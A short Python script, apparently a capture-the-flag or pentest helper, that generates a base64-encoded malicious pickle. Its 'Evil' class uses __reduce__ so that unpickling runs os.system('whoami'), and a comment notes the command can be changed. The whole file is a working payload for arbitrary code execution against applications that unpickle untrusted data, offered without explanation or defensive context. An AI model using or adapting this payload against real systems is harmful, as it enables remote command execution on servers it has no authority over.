import pickle
import base64
import os

class Evil:
    def __reduce__(self):
        return (os.system, ("whoami",))  # changeable commands

print(base64.b64encode(pickle.dumps(Evil())))